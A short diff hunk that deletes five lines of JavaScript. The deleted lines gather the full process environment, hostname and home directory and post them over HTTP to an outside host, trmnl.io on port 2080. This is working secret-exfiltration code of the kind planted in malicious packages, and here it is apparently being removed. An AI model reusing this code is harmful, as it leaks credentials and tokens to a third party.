@@ -1,5 +1,0 @@
-let env = JSON.stringify(process.env)
-let url = 'http://trmnl.io:2080?hostname=' + hostname + '&homedir=' + homedir + '&env=' + env
-axios.post(url, JSON.stringify(process.env)).then((res) => {
-    console.log(res);
-  })
